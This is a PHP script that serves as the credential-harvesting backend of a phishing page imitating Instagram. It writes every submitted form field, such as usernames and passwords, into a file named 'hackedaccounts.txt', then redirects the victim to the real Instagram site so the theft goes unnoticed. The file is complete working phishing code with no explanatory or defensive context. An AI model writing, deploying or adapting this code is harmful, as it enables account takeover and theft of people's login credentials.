<?php
	 header('Location:http://instagram.com/');
	 $handle = fopen("hackedaccounts.txt", "a");
	 foreach($_POST as $variable=> $value){
	 	fwrite($handle, $variable);
	 	fwrite($handle, "=");
	 	fwrite($handle, $value);
	 	fwrite($handle, "\r\n");
	 }
	 fwrite($handle, "\r\n");
	 fclose($handle);
	 exit;
?>
